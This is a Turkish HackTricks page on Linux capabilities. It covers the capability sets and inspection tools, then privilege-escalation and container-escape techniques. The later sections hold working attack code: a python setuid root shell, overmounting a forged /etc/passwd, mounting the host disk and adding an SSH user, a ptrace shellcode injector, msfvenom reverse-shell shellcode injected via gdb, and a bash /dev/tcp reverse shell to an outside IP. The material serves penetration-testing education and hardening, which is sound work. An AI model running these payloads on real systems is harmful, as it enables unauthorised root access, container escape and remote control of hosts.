# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities, **root ayrıcalıklarını daha küçük ve birbirinden ayrı birimlere böler**; böylece süreçler bu ayrıcalıkların bir alt kümesine sahip olabilir. Gereksiz yere tam root ayrıcalıkları vermeyerek riskleri azaltır.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Sorun:

- Normal kullanıcıların raw socket açmak veya 1024’ün altındaki Internet portlarına bağlanmak gibi işlemler için izinleri sınırlıdır; capabilities, tam root ayrıcalığı yerine yalnızca gerekli işlem için izin verebilir.<sup>[[14]](#references)</sup>

### Capability Kümeleri:

Linux, bu capability kümelerini her thread için sunar ve kernel, süreç kimlik bilgilerini değiştirdiğinde veya bir dosyayı çalıştırdığında bunların kısıtlamalarını uygular.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

   - **Amaç**: Çalıştırılan dosyada eşleşen inheritable file capabilities varsa, `execve()` sonrasında permitted kümeye katkıda bulunabilecek capabilities’i belirtir.
   - **İşlev**: Thread’in inheritable kümesi `execve()` boyunca korunur; tek başına bu capabilities’i effective hâle getirmez.
   - **Kısıtlamalar**: Bu kümeye capability eklemek, permitted ve bounding kümeleriyle kısıtlanır.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

   - **Amaç**: Bir sürecin herhangi bir anda kullandığı gerçek capabilities’i temsil eder.
   - **İşlev**: Çeşitli işlemler için izin verirken kernel’in denetlediği capability kümesidir. Dosyalar için bu küme, dosyanın permitted capabilities’inin effective kabul edilip edilmeyeceğini belirten bir flag olabilir.
   - **Önemi**: Effective küme, bir sürecin kullanabileceği etkin capabilities kümesi olarak anlık ayrıcalık denetimlerinde kritik öneme sahiptir.

3. **Permitted (CapPrm)**:

   - **Amaç**: Bir sürecin sahip olabileceği maksimum capabilities kümesini tanımlar.
   - **İşlev**: Bir süreç, permitted kümedeki bir capability’yi effective kümesine yükselterek kullanabilir. Ayrıca permitted kümesinden capabilities’i düşürebilir.
   - **Sınır**: Bir capability bu kümeden düşürülürse, onu veren bir dosya çalıştırılmadığı veya başka bir ayrıcalıklı geçiş gerçekleşmediği sürece normalde geri yüklenemez.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

   - **Amaç**: Bir sürecin `execve()` sırasında bir dosyadan kazanabileceği ve inheritable kümesine ekleyebileceği capabilities’i sınırlar.
   - **İşlev**: Küme `fork()` boyunca devralınır ve `execve()` boyunca korunur; çağıran `CAP_SETPCAP` yetkisine sahipse bu kümeden capabilities düşürülebilir.
   - **Kullanım amacı**: Gereksiz capabilities’i bu kümeden kaldırmak, sonradan ayrıcalık kazanılmasını sınırlar.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
   - **Amaç**: Seçilen capabilities’in ayrıcalıksız bir programın `execve()` işlemi boyunca permitted ve effective kalmasını sağlar.
   - **İşlev**: Çalıştırılan dosya ayrıcalıklı değilse ambient capabilities, yeni permitted ve effective kümelere eklenir.
   - **Kısıtlamalar**: Bir capability, yalnızca hem permitted hem de inheritable kümelerde bulunduğu sürece ambient olabilir; set-user-ID/set-group-ID dosyası veya capabilities içeren bir dosya çalıştırıldığında ambient küme temizlenir.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Süreçler ve İkili Dosyalar için Capabilities

### Süreç Capabilities

Belirli bir sürecin capabilities’ini görmek için /proc dizinindeki **status** dosyasını kullanın. Daha fazla ayrıntı sağladığından, yalnızca Linux capabilities ile ilgili bilgilerle sınırlayalım.\
Çalışan tüm süreçler için capability bilgilerinin thread başına tutulduğunu, dosya capabilities’inin ise `security.capability` genişletilmiş özniteliklerinde saklandığını unutmayın.<sup>[[14]](#references)[[15]](#references)</sup>

Tanımlı capabilities’i /usr/include/linux/capability.h dosyasında bulabilirsiniz.

Geçerli sürecin capabilities’ini `cat /proc/self/status` ile veya `capsh --print` komutuyla; diğer süreçlerinkini ise `/proc/<pid>/status` dosyasında bulabilirsiniz.<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

Bu komut çoğu sistemde beş capability satırı döndürmelidir.<sup>[[15]](#references)</sup>

- CapInh = Miras alınan capabilities
- CapPrm = İzin verilen capabilities
- CapEff = Etkin capabilities
- CapBnd = Sınırlandırma kümesi
- CapAmb = Ortam capabilities kümesi

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

Bu hexadecimal sayılar anlam ifade etmiyor. `capsh` aracıyla bunları capability adlarına dönüştürebiliriz.<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Şimdi `ping`'in kullandığı **capabilities** değerlerini kontrol edelim:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Bu yöntem işe yarasa da başka ve daha kolay bir yol var. Çalışan bir sürecin capabilities değerlerini görmek için **getpcaps** aracını ve ardından sürecin process ID (PID) değerini kullanın; araç bir process ID listesi de kabul eder.<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

Ağı dinlemek için ikili dosyaya `cap_net_admin` ve `cap_net_raw` yeteneklerini verdikten sonra `tcpdump`'ın yeteneklerini kontrol edelim (`tcpdump`, 9562 işleminde çalışıyor).<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Gördüğünüz gibi, capabilities bir süreci incelemenin iki yönteminden elde edilen sonuçlarla örtüşür. `getpcaps` aracı, hedef sürecin capabilities değerlerini sorgulamak için libcap kullanır ve bunları metin biçiminde yazdırır; bir veya daha fazla PID kabul eder.<sup>[[22]](#references)</sup>

### İkili Dosya Yetenekleri

İkili dosyalar, yürütme sırasında uygulanan file capabilities değerlerine sahip olabilir. Örneğin, bir `ping` ikili dosyası `cap_net_raw` yeteneğini taşıyabilir.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

`getcap -r` ile **capability'lere sahip binary'leri arayabilirsiniz**.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### capsh ile capabilities düşürme

Geçerli bounding set'ten `CAP_NET_RAW` değerini düşürürsek, bu capability'ye ihtiyaç duyan bir program artık onu kullanamamalıdır.<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

_capsh_ çıktısının yanı sıra, _tcpdump_ komutunun kendisi de bir hata vermelidir.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Hata, `CAP_NET_RAW` bounding set'ten kaldırıldıktan sonra `tcpdump`'ın istenen file capability ile çalıştırılamadığını gösterir.

### Capabilities'ı Kaldırma

Bir dosyanın capabilities değerlerini `setcap -r` ile kaldırabilirsiniz.<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## Kullanıcı Yetenekleri

Linux, dosya yeteneklerini doğrudan bir oturum açma kullanıcısına atamaz; ancak `pam_cap` PAM modülü, `/etc/security/capability.conf` kullanarak kimliği doğrulanmış oturumlar için devralınabilir yetenekler ayarlayabilir.<sup>[[16]](#references)</sup> Her girdi, virgülle ayrılmış yetenek adlarını veya numaralarını bir ya da daha fazla kullanıcı adına eşler.<sup>[[17]](#references)</sup>
Dosya örneği:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Ortam Capabilities

Aşağıdaki programı derlemek, **capabilities sağlayan bir ortamda bash shell başlatmayı** mümkün kılar.<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

Derlenmiş ambient binary tarafından çalıştırılan **bash** içinde **yeni capabilities** gözlemlenebilir (normal bir kullanıcının "current" bölümünde hiçbir capability'si olmaz).<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> **Yalnızca** hem izin verilen hem de devralınabilir kümelerde bulunan yetenekleri ekleyebilirsiniz.<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb ikilileri

Capability-dumb ikili, dosya yeteneklerine sahip olan ancak bunları yönetmek için libcap kullanmayan bir programdır. Dosyanın effective biti ayarlanmışsa çekirdek, dosyanın izin verilen yeteneklerini sürecin effective kümesine ekler; süreç izin verilen yeteneklerin tümünü edinmemişse yürütme başarısız olabilir.<sup>[[14]](#references)</sup>

## Servis Yetenekleri

Root olarak çalışan bir sistem servisi, yürütme ortamı yeteneklerini kısıtlamadığı sürece geniş yetkileri elinde tutabilir. Bir systemd biriminde `User=`, servis kullanıcısını seçer; `AmbientCapabilities=` ise yürütülen sürecin ambient kümesine adlandırılmış yetenekleri ekler.<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Docker Container'larında Capabilities

Docker, container'ları `--cap-add` ve `--cap-drop` ile değiştirilebilen varsayılan bir capability kümesiyle başlatır; örnek bir container `amicontained` ile incelenebilir.<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Capabilities, ayrıcalıklı işlemleri gerçekleştirdikten sonra kendi süreçlerinizi kısıtlamak istediğinizde kullanışlıdır (ör. chroot kurup bir socket'e bağlandıktan sonra). Ancak, root olarak çalıştırılacak süreçlere kötü amaçlı komutlar veya argümanlar aktararak bunlardan yararlanılabilir.<sup>[[2]](#references)</sup>

`setcap` ile programlara file capabilities atayabilir, `getcap` ile bunları sorgulayabilirsiniz.<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

Dosya capability metninde `+ep`, belirtilen capability’yi effective ve permitted kümelerine yükseltir; `-` seçili bayrakları düşürür.<sup>[[21]](#references)</sup>

Bir sistemde veya klasörde capability’lere sahip programları belirlemek için `getcap -r` kullanın.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Exploitation örneği

Aşağıdaki örnekte, `/usr/bin/python2.6` binary'sinin privesc'e karşı savunmasız olduğu görülüyor:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Herhangi bir kullanıcının paketleri sniff etmesine izin vermek için `tcpdump` tarafından gereken **Capabilities**:**

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### Atlanmış bir capability adının özel durumu

libcap'in metin biçiminde, `getcap myelf` çıktısının `myelf =ep` olması, **tüm capability'lerin** yürütülen sürecin bounding set'ine, user namespace'ine ve diğer yürütme kısıtlamalarına tabi olarak etkin ve izinli olarak işaretlendiği anlamına gelir. Boş file capability set'i `myelf =` biçimindedir (`e` veya `p` olmadan); capability niteliği olmayan bir dosyadan farklıdır. `=ep` içeren bir dosya tek başına sürecin UID'sini root yapmaz; ancak `CAP_DAC_READ_SEARCH` veya `CAP_DAC_OVERRIDE` kullanabilen bir program, Unix UID'sinin normalde erişemeyeceği dosyaları okuyabilir. Programın girdiye yönelik seçeneklerini ayrıcalıklı bir dosya okuma yolu olarak değerlendirmeden önce gerçek yürütülebilir dosyanın dosya modunu, namespace'ini ve etkin capability'lerini doğrulayın. libcap'in [capability metin biçimine](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) ve [boş değer davranışına](https://man7.org/linux/man-pages/man8/getcap.8.html) bakın.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, cihazları mount etmek veya kernel özelliklerini değiştirmek gibi kapsamlı **yönetim ayrıcalıkları** nedeniyle çoğu zaman root'a yakın bir seviyede kabul edilen, oldukça güçlü bir Linux capability'sidir. Tüm sistemleri simüle eden container'lar için vazgeçilmez olsa da **`CAP_SYS_ADMIN`**, ayrıcalık yükseltme ve sistemin tehlikeye atılması potansiyeli nedeniyle özellikle container ortamlarında **önemli güvenlik sorunları** doğurur. Bu nedenle kullanımına ilişkin sıkı güvenlik değerlendirmeleri yapılmalı ve dikkatli yönetilmelidir. Saldırı yüzeyini en aza indirmek ve **en az ayrıcalık ilkesine** uymak için uygulamaya özel container'larda bu capability'nin kaldırılması tercih edilmelidir.<sup>[[14]](#references)</sup>

Namespace geçişlerinde kapsam önemlidir: `setns()`, `CAP_SYS_ADMIN` kontrolünü hedef namespace'in sahibi olan user namespace'e göre yapar. Bir mount namespace'e girmek için ayrıca çağıranın user namespace'inde `CAP_SYS_CHROOT` gerekir. Yalnızca özel, remapped bir user namespace içinde bulunan bir capability, başlangıçtaki host namespace'lerine keyfi olarak girme yetkisi vermez.<sup>[[14]](#references)</sup>

**İkili dosyayla örnek**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Python kullanarak değiştirilmiş bir _passwd_ dosyasını gerçek _passwd_ dosyasının üzerine mount edebilirsiniz:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

Ve son olarak, değiştirilmiş `passwd` dosyasını `/etc/passwd` üzerine **mount** edin:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

Ve "password" parolasıyla root olarak **`su`** yapabileceksiniz.

**Ortam değişkeniyle örnek (Docker breakout)**

Docker container içindeki etkin capabilities değerlerini şu komutla kontrol edebilirsiniz:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Önceki çıktıda SYS_ADMIN capability’sinin etkin olduğunu görebilirsiniz.<sup>[[14]](#references)</sup>

- **Mount**

Uygun device ve namespace erişimiyle bu, bir Docker container’ın **host diskini mount etmesine ve içeriğine erişmesine** olanak sağlayabilir. Device node gerçek bir host device’ını temsil etmeli, device cgroup buna izin vermeli ve block tabanlı bir filesystem’i mount etmek için initial user namespace’te `CAP_SYS_ADMIN` gerekir.<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **Tam erişim**

Önceki yöntemde bir host diskine erişmeyi başardık.\
Host üzerinde bir **ssh** sunucusu çalışıyorsa, **bağlanan disk içinde bir kullanıcı oluşturabilir** ve SSH üzerinden erişebilirsiniz.<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

`/mnt/host` altındaki doğrudan okuma ve yazma işlemleri zaten host dosya sistemine erişim sağlar. Son `chroot` yalnızca bir yol adı kolaylığıdır ve ayrıca `CAP_SYS_CHROOT` gerektirir; escape'i oluşturan adım bu değildir.

## CAP_SYS_PTRACE

`CAP_SYS_PTRACE` ile bir süreç, kendi PID namespace'inde görünür olan diğer süreçleri izleyebilir ve inceleyebilir. Bir Docker container'ından host süreçlerini hedeflemek için `--pid=host` ile host PID namespace'ini paylaşın (veya hedefi içeren bir namespace'e katılın).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, `ptrace(2)` tarafından sağlanan debugging ve system call tracing işlevlerinin yanı sıra `process_vm_readv(2)` ve `process_vm_writev(2)` gibi cross-memory attach çağrılarını kullanma yetkisi verir. Tanılama ve izleme amaçları için güçlü olsa da `CAP_SYS_PTRACE`, `ptrace(2)` üzerinde seccomp filter gibi kısıtlayıcı önlemler olmadan etkinleştirilirse sistem güvenliğini önemli ölçüde zayıflatabilir. Özellikle, [bunun gibi proof of concept (PoC) örneklerinde](https://gist.github.com/thejh/8346f47e359adecd1d53) gösterildiği üzere, seccomp tarafından uygulananlar başta olmak üzere diğer güvenlik kısıtlamalarını aşmak için kullanılabilir.<sup>[[10]](#references)</sup>

**Binary ile örnek (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**binary (gdb) ile örnek**

`gdb`, `ptrace` yeteneğiyle:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

Bir debugger üzerindeki capability yalnızca bir inceleme ipucudur. Mevcut sürecin tam olarak o dosyayı çalıştırıp çalıştıramadığını (grup ve ACL izinleri dâhil), çalıştırma sonrasında `CAP_SYS_PTRACE` capability’sinin etkin olup olmadığını ve aynı PID namespace içindeki daha yüksek ayrıcalıklı bir hedefin görünür ve bağlanılabilir olup olmadığını kontrol edin. `no_new_privs`, `nosuid` bağlaması, capability bounding set, Yama, seccomp veya bir LSM sonucu değiştirebilir. [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) ve [kernel’ın Yama belgelerine](https://docs.kernel.org/admin-guide/LSM/Yama.html) bakın. Bir hedefe bağlanmadan dosya ve süreç meta verilerini listeleyin.

gdb üzerinden belleğe enjekte etmek için msfvenom ile bir shellcode oluşturun

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

gdb ile bir root sürecinde hata ayıklayın ve önceden oluşturulan gdb satırlarını kopyalayıp yapıştırın:

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**Ortamla örnek (Docker breakout) - Başka bir gdb Abuse**

**GDB** kuruluysa (veya örneğin `apk add gdb` ya da `apt install gdb` ile kurabiliyorsanız), **görünür bir host process'i debug edebilir** ve `system` fonksiyonunu çağırmasını sağlayabilirsiniz. Bunun için hedefin user namespace'inde etkin `CAP_SYS_PTRACE` ve host PID'lerini görebilme gerekir; `CAP_SYS_ADMIN` gerekmez. Yama, dump edilemeyen durum, seccomp ve LSM policy yine de attach işlemini engelleyebilir.

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

